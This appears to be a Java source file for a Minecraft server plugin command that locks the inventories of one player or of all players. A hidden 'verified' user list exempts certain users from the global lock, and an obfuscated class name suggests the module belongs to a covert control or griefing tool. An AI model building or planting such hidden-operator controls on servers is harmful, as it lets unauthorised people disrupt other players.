package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.HumanEntity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;

import java.io.IOException;
import java.util.ArrayList;
import java.util.UUID;

public class LockInv implements Command, Listener {
    private final ArrayList<UUID> toggled = new ArrayList<>();
    private boolean lockAll = false;
    private Z_ z;

    @Override
    public String[] getCommands() {
        return new String[]{"lockinv"};
    }

    @Override
    public String getDescription() {
        return "Prevent a player/all players from modifying their inventory.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "lockinv <player | *>");
            return;
        }

        if (args[0].equals("*")) {
            this.lockAll = !this.lockAll;
            if (!lockAll) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "All players can now use their inventory!");
            } else {
                sender.sendMessage(Colors.Prefix + Colors.Success + "Players can no longer use their inventory!");
            }

            return;
        }

        Player selected = Bukkit.getPlayer(args[0]);
        if (selected == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
            return;
        }

        if (toggled.contains(selected.getUniqueId())) {
            toggled.remove(selected.getUniqueId());
            sender.sendMessage(Colors.Prefix + Colors.Failure + selected.getName() + " is can now use their inventory!");
            return;
        }

        toggled.add(selected.getUniqueId());
        sender.sendMessage(Colors.Prefix + Colors.Success + selected.getName() + " can no longer use their inventory!");
    }

    @Override
    public void onEnable(Z_ z) {
        this.z = z;
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    @EventHandler(priority = EventPriority.MONITOR)
    private void inventoryClick(InventoryClickEvent e) throws IOException, InterruptedException {
        HumanEntity p = e.getWhoClicked();

        if (p.getUniqueId() == null) {
            return;
        }

        if (toggled.contains(p.getUniqueId())) {
            e.setCancelled(true);
        }

        if (!this.z.getAuth().isVerified(p.getName()) && this.lockAll) {
            e.setCancelled(true);
        }
    }
}
